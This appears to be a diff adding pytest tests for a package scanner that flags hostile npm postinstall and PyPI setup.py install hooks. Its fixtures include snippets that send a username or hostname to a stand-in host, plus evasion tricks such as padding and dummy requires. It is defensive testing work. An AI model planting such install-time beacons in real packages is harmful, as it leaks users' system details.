@@ -559,3 +559,100 @@ class TestTransitiveRequires:
         files["m8.js"] = BEACON_JS
         f = _npm_hook_findings({"postinstall": "node m0.js"}, files)
         assert _sev(f) == ["medium"], f
+
+
+# ---------------------------------------------------------------------------
+# second review of #436
+# ---------------------------------------------------------------------------
+
+
+class TestSecondReviewSpeed:
+    @pytest.mark.parametrize("text", [
+        "a=atob(1);" * 30000,
+        "".join(f"v{i}=atob(1);" for i in range(25000)),
+        "".join(f"u{i}=os.userInfo();" for i in range(25000)),
+        "a=os.userInfo();" * 30000,
+        "".join(f"v{i}=atob(1);eval(w{i});" for i in range(20000)),
+    ])
+    def test_name_tracking_is_linear(self, text):
+        import time
+        t0 = time.monotonic()
+        js_signals(text)
+        assert time.monotonic() - t0 < 2.0
+
+    def test_beacon_in_the_middle_of_padding(self):
+        pad = "// " + "x" * 120 + "\n"
+        body = pad * 1500 + BEACON_JS + pad * 1500  # ~370 KB, beacon in the middle
+        assert len(body) > 350_000
+        assert js_signals(body) >= {"net", "recon"}
+        f = _npm_hook_findings({"postinstall": "node index.js"}, {"index.js": body})
+        assert _sev(f) == ["high"]
+
+
+class TestSecondReviewPrecision:
+    def test_uname_printed_is_not_recon(self):
+        src = ("import platform, requests\nfrom setuptools import setup\n"
+               "print('building on', platform.uname())\n"
+               "requests.get('https://github.com/probe/probe/releases/download/v1/x.so')\n"
+               "setup(name='probe')\n")
+        assert all("host or user" not in f.name and "host or user" not in f.snippet
+                   for f in detect_pypi_install_exec(src, "setup.py"))
+
+    def test_username_in_a_local_path_is_not_recon(self):
+        body = ("const os = require('os'); const https = require('https');\n"
+                "const info = os.userInfo();\nconst dir = `/tmp/tool-${info.username}`;\n"
+                "https.get('https://github.com/probe/probe/releases/download/v1/bin', "
+                "() => {});\n")
+        assert "recon" not in js_signals(body)
+        f = _npm_hook_findings({"postinstall": "node install.js"}, {"install.js": body})
+        assert _sev(f) == ["medium"]
+
+    def test_username_sent_is_recon(self):
+        body = ("const os = require('os'); const https = require('https');\n"
+                "const info = os.userInfo();\n"
+                "https.get('https://x.example.net/?u=' + info.username, () => {});\n")
+        assert "recon" in js_signals(body)
+
+
+class TestSecondReviewEvasions:
+    @pytest.mark.parametrize("loader", [
+        "require(require('path').join(__dirname,'c.js'));\n",
+        "const path = require('path'); require(path.join(__dirname, 'lib', 'c.js'));\n",
+        "require('./' + 'c');\n",
+    ])
+    def test_require_forms(self, loader):
+        target = "lib/c.js" if "'lib'" in loader else "c.js"
+        f = _npm_hook_findings({"postinstall": "node a.js"},
+                               {"a.js": loader, target: BEACON_JS})
+        assert _sev(f) == ["high"], loader
+
+    def test_payload_behind_dummy_requires(self):
+        files = {f"d{i}.js": f"module.exports = {i};\n" for i in range(55)}
+        files["a.js"] = "".join(f"require('./d{i}');\n" for i in range(55)) \
+            + "require('./z');\n"
+        files["z.js"] = BEACON_JS
+        f = _npm_hook_findings({"postinstall": "node a.js"}, files)
+        assert _sev(f) == ["high"], f
+
+    def test_install_class_on_a_sdist_base(self):
+        src = ("import socket, requests\nfrom setuptools import setup\n"
+               "from setuptools.command.sdist import sdist\n"
+               "class install(sdist):\n    def run(self):\n"
+               "        requests.get('https://x.example.net/', "
+               "params={'h': socket.gethostname()})\n"
+               "setup(name='probe', cmdclass={'install': install})\n")
+        assert _sev(detect_pypi_install_exec(src, "setup.py")) == ["high"]
+
+    def test_sdist_class_registered_as_sdist_stays_guarded(self):
+        src = ("import os\nfrom setuptools import setup\n"
+               "from setuptools.command.sdist import sdist\n"
+               "class Sdist(sdist):\n    def run(self):\n"
+               "        os.system('git describe > VERSION')\n"
+               "setup(name='probe', cmdclass={'sdist': Sdist})\n")
+        assert detect_pypi_install_exec(src, "setup.py") == []
+
+    def test_uname_bound_to_a_name(self):
+        src = ("import os, requests\nfrom setuptools import setup\nu = os.uname()\n"
+               "requests.get('https://x.example.net/', params={'n': u.nodename})\n"
+               "setup(name='probe')\n")
+        assert _sev(detect_pypi_install_exec(src, "setup.py")) == ["high"]
